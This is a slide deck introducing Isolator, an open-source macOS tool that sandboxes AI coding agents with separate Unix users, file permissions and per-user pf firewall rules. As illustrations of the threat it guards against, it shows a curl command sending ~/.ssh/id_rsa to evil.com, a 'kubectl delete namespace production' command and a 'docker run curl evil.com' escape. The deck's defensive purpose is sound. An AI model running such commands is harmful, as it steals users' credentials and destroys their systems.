---
marp: true
theme: default
paginate: true
backgroundColor: #ffffff
color: #1d1d1f
style: |
  section {
    font-family: 'SF Pro Display', 'Helvetica Neue', sans-serif;
    font-size: 28px;
  }
  h1, h2 {
    color: #0071e3;
  }
  code {
    background: #f5f5f7;
    color: #d63384;
    font-size: 22px;
  }
  pre {
    background: #f5f5f7 !important;
    border-radius: 8px;
    font-size: 20px;
    color: #1d1d1f;
  }
  table {
    font-size: 24px;
  }
  th {
    background: #0071e3;
    color: #fff;
  }
  td {
    background: #f5f5f7;
  }
  strong {
    color: #e3002b;
  }
  a {
    color: #0071e3;
  }
  section.lead h1 {
    font-size: 52px;
    text-align: center;
  }
  section.lead p {
    text-align: center;
    font-size: 24px;
    color: #86868b;
  }
---

<!-- _class: lead -->

# Isolator

Zero-Overhead Sandboxing for AI Coding Agents on macOS

---

## The Problem: Agents Need Freedom to Be Useful

The key metric for coding agents: **how long can a single run last?**

Permission prompts kill flow:

- "Allow file write?" -- Yes
- "Allow network access?" -- Yes
- "Allow bash execution?" -- Yes
- Repeat 200 times per session...

**Solution:** `--permission-mode=bypassPermissions`

---

## But Full Autonomy = Full Risk

With bypass mode, the agent has **unrestricted access** to:

- Your filesystem -- `~/.ssh/`, `~/.aws/`, `~/.kube/`
- Your network -- `curl https://evil.com/?key=$(cat ~/.ssh/id_rsa)`
- Your tools -- `kubectl delete namespace production`

One malicious prompt injection is enough.

---

## Can't We Just Use the Agent's Built-In Sandbox?

Claude Code, Codex, Gemini -- all have some sandbox settings.

Problems:

- **Self-policing** -- the agent enforces its own restrictions
- **Incomplete** -- Bash subprocesses can bypass tool-level controls
- **Fragile** -- config format changes between versions
- **Not portable** -- each agent has its own sandbox model

We need enforcement **below** the agent.

---

## Docker? Not on macOS.

On Linux: Docker = native containers. Zero overhead. Great.

On macOS: Docker = hidden Linux VM.

- ~2GB RAM overhead
- Slow filesystem mounts (virtiofs / gRPC fuse)
- Agents can't use tools you've already installed and configured
- Every tool change means rebuilding the Docker image

We want native tools, native speed, native filesystem.

---

## Agents Need Your Real Tools

A coding agent is only as good as the tools it can reach.

```
/usr/local/bin/
  claude, codex             AI agents themselves
  node, npm, npx            JS ecosystem
  python3, pip              Python ecosystem
  clickhouse-client         databases
  kubectl, helm             k8s
  terraform                 infrastructure
  gcc, make, cmake          compilers
```

---

## The Solution: macOS Users + RBAC

macOS already has everything we need:

| Need | macOS Feature |
|------|--------------|
| Process isolation | Unix users |
| File isolation | chmod 700 + POSIX ACLs |
| Network isolation | pf firewall (by UID) |
| Tool sharing | Read-only `/opt/homebrew`, `/usr/local` |
| Admin control | sudo with Touch ID |

Zero overhead. No VM. No Docker.

---

## Architecture

```
you (admin, has root via Touch ID sudo)
 |
 |-- iso acm claude                 # ACM project
 |-- iso click codex                # ClickHouse project
 |-- iso mcp claude                 # mcp project
 |
 +-- acm    uid=600  /Users/acm/    chmod 700
 +-- click  uid=601  /Users/click/  chmod 700
 +-- mcp  uid=602  /Users/tools/  chmod 700
```

Each sandbox user:
- Can't read your home or others
- Can't access network except whitelisted hosts
- Can read `/opt/homebrew`, `/usr/local` (shared tools)
- Has its own API keys, config, MCP servers, python libraries

---

## Isolator: One Script, One Config

**`iso create <name>`** -- creates a macOS user by copying your:
- shell config (`.bashrc`, `.bash_profile`)
- Claude/Codex config (settings, MCP servers, plugins)
- Claude/Codex auth (from keychain or API KEY)

Also grants read/write access for `main` user to sandbox

**`iso pf`** -- generates per-user firewall rules:
- Resolves hostnames to IPs from config
- Each user gets their own allowlist
- Kernel-level enforcement by UID

---

## The Config

```toml
admin = "bvt"

[global]
hosts = ["registry.npmjs.org", "pypi.org",
         "files.pythonhosted.org"]

[users.acm]
uid = 600
hosts = ["api.anthropic.com", "mcp.demo.altinity.cloud"]

[users.click]
uid = 601
hosts = ["api.anthropic.com", "api.openai.com"]

[users.mcp]
uid = 602
hosts = ["api.anthropic.com"]
```

---

## What the Agent Sees

```
/Users/acm/                         (chmod 700, own home)
  .bash_profile                     your shell config + isolator profile
  .claude/settings.json             your settings 
  .local/bin/                       pip installs
  .npm-global/                      npm installs
  workspace/                        working directory
```

Shared tools (read-only):
```
/opt/homebrew/bin/                  brew packages
/usr/local/bin/                     clickhouse-client, node, claude, ...
```

---

## Security Layers

| Layer | Mechanism | Agent can bypass? |
|-------|-----------|:-:|
| **Filesystem** | chmod 700 + root-set ACL | No |
| **Network** | pf firewall by UID | No (kernel) |
| **No escalation** | No password, no sudoers | No |
| **Config** | Root-owned, chmod 444 | No |
| **Your home** | Standard Unix DAC | No |
| **Your tools** | World-readable, not writable | No |

The agent has full autonomy **within its sandbox**.
No permission prompts. No interruptions. No risk.

---

## Usage

```bash
# One-time setup
iso create acm --keychain-pass ttt
iso create click --keychain-pass ttt
iso pf

# Run agents
iso acm claude                    # Claude on ACM project
iso click codex                   # Codex on ClickHouse

# Read their work from your account
cat /Users/acm/workspace/main.py

# Refresh config after changes
iso create acm                    # re-copies shell/claude config
iso pf                            # refresh firewall rules
```

---

## Why Not Other Approaches?

| Approach | Problem |
|----------|---------|
| Agent's built-in sandbox | Self-policing, fragile, per-agent |
| Docker on macOS | VM overhead, no native tools |
| Full VM | Heavy, slow, no tool sharing |
| nsjail / firejail | Linux only |
| macOS App Sandbox | Requires signed app bundle |
| **Unix users + pf** | **Native, zero overhead, battle-tested** |

---

## But What About Docker? Agents Need It.

AI agents don't just write code — they **build and test** it.

```bash
docker-compose up -d    # start ClickHouse, Postgres, Redis
npm test                # integration tests hit real services
```

**The problem:** 
- Docker containers run inside a Linux VM by `main` user 
- macOS `pf` rules (by UID) don't apply. An agent can `docker run curl evil.com`.

**The solution:**

- hardlink docker socket to /var
- limit docker network by iptables

---

## Docker Network Isolation

Per-user Docker networks with iptables egress rules inside the VM:

```
iso-acm network (172.30.0.0/24)
  ├── ACCEPT  container → container     ✅ same subnet
  ├── ACCEPT  container → DNS           ✅ port 53
  ├── ACCEPT  container → whitelisted   ✅ from config.toml
  └── DROP    container → *             ❌ everything else
```

`docker pull` still works — it's a **daemon** operation, not container traffic.

```bash
docker pull clickhouse/clickhouse-server   # ✅ daemon pulls
docker run --network=iso-acm clickhouse    # ✅ starts
# container curl evil.com                  # ❌ blocked by iptables
```

`iso pf` generates **both** macOS pf rules and Docker iptables rules from the same config.

---

## Backups: Don't Leak Your Chat Transcripts

Time Machine runs as **root** — it ignores all isolation and backs up everything.

By default, every agent session — chat history, credentials, workspace — ends up on your backup drive. Multiple sandboxed users **multiply** the problem.

`iso create` auto-excludes each sandboxed home from Time Machine:

```bash
tmutil addexclusion /Users/acm    # runs automatically
```

Your agent's work is ephemeral. **Push to git, don't rely on backups.**

---

<!-- _class: lead -->

# Isolator

Open source. Python. Stdlib only.

One script. One config. Works today.

[github.com/BorisTyshkevich/isolator](https://github.com/BorisTyshkevich/isolator)
